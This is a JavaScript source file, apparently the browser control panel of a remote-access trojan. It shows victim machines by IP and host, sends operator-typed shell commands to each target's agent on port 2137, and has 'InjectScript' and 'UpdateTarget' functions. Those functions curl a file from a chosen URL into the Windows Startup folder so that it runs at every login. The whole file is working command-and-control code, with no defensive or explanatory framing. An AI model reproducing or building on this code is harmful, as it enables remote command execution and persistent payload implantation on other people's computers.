document.addEventListener("DOMContentLoaded", function () {
    const consoleDiv = document.getElementById("console");
    const inputElement = document.getElementById("input");
    const inputName = document.getElementById("filename");
    const inputUrl = document.getElementById("fileurl");
    const ClientInfo = document.getElementById("client_info");
    const popup = document.querySelector("#popup")
    const UpdateB = document.querySelector('.update')

    const urlPattern = /^(https?:\/\/)?([\w.-]+\.[a-z]{2,})(\/\S*)?$/i;
    const filenamePattern = /^[a-zA-Z0-9_-]+\.[a-zA-Z]{2,5}$/;

    let target_IP;

    function openConsoleAt(IP, Host, Online, Version, ToUpdate) {

        ClientInfo.innerHTML = 
        `
        
           <span>IP: &#160 <p>${IP}</p></span>
           <span>Host: &#160 <p>${Host}</p></span>
           <span>Last Online: &#160 <p>${Online}</p></span>
           <span>ScripVersion: &#160 <p>${Version}</p></span>

            
        `

        if (ToUpdate == "true") {
            UpdateB.innerHTML = `<button onclick='popupOpenU()'>Update</button>`
            console.log(ToUpdate);
        } else {
            UpdateB.innerHTML = ''
            console.log(ToUpdate);
        }

        popup.classList.toggle("widziszMnie")
        
        target_IP = IP
    }
    
    function appendToConsole(message) {
        const newLines = message.split('\n');
        newLines.forEach((line) => {
            const newLine = document.createElement("div");
            newLine.textContent = line;
            consoleDiv.appendChild(newLine);
        });

        consoleDiv.scrollTop = consoleDiv.scrollHeight;
    }

 

    async function InjectScript() {
        const command = `cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup && curl ${inputUrl.value} --output ${inputName.value}`;


        if (inputName.value == '' || inputUrl.value == '') {
            alert("Empty Inputs")
        } else {
            if (filenamePattern.test(inputName.value) && urlPattern.test(inputUrl.value)) {
                    try {
                        const response = await fetch(`http://${target_IP}:2137/execute_command`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ command })
                        });
            
                        const result = await response.json();
            
                        if (result.status === 'success') {
                            appendToConsole(`${result.result}`);
                        } else {
                            appendToConsole(`Błąd: ${result.error}`);
                        }
                    } catch (error) {
                        console.error('Wystąpił błąd:', error);
                    }
                } else {
                    alert("Invalid Inputs");
                }
            }
    }

    

    async function UpdateTarget() {
        let IP = target_IP
        const updatePopup = document.querySelector('#update_popup')
        const updateInputUrl = document.querySelector('#update_url')
        const updateInputName = document.querySelector('#update_name')
        const updateInputVersion = document.querySelector('#update_ver')

        path = 'cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'

        let command = `${path} && curl ${updateInputUrl.value} --output ${updateInputName.value}`;


        if (updateInputName.value == '' || updateInputUrl.value == '') {
            alert("Empty Inputs")
        } else {
            if (filenamePattern.test(updateInputName.value) && urlPattern.test(updateInputUrl.value) && updateInputVersion.value != '') {
                    try {
                        const response = await fetch(`http://${IP}:2137/execute_command`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json' 
                            },
                            body: JSON.stringify({ command })
                        });
            
                        const result = await response.json();
                        document.querySelector('#update_popup').classList.toggle("widziszMnie")
            
                        if (result.status === 'success') {
                            appendToConsole(`${result.result}`);

                        try {
                            const response = await fetch('http://localhost:3001/UpdateVersion', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({ NewScriptVersion: updateInputVersion.value })
                            
                        });
                        document.querySelector('#update_popup').classList.toggle("widziszMnie")
                        
                        const result = await response.json();
            
                        if (result.status === 'success') {
                            console.log(`${result.result}`);
                            
                            document.querySelector('#update_popup').classList.toggle("widziszMnie")
                        } else {
                            appendToConsole(`Błąd: ${result.error}`);
                        }
                        } catch (error) {
                            console.error('Wystąpił błąd:', error);
                        }

                            
                            document.querySelector('#update_popup').classList.toggle("widziszMnie")
                        } else {
                            appendToConsole(`Błąd: ${result.error}`);
                        }
                    } catch (error) {
                        console.error('Wystąpił błąd:', error);
                    }
                } else {
                    alert("Invalid Inputs");
                }
            }        
    }

    

    async function sendCommand() {
        const command = inputElement.value.trim();
        inputElement.value = '';

        if (command) {
            try {
                const response = await fetch(`http://${target_IP}:2137/execute_command`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ command })
                });

                const result = await response.json();

                if (result.status === 'success') {
                    appendToConsole(`${result.result}`);
                } else {
                    appendToConsole(`Błąd: ${result.error}`);
                }
            } catch (error) {
                console.error('Wystąpił błąd:', error);
            }
        }
    }

    inputElement.addEventListener('keydown', function (event) {
        if (event.key === 'Enter') {
            event.preventDefault();
            sendCommand();
        }
    });


    window.sendCommand = sendCommand;
    window.InjectScript = InjectScript;
    window.openConsoleAt = openConsoleAt;
    window.UpdateTarget = UpdateTarget;
});
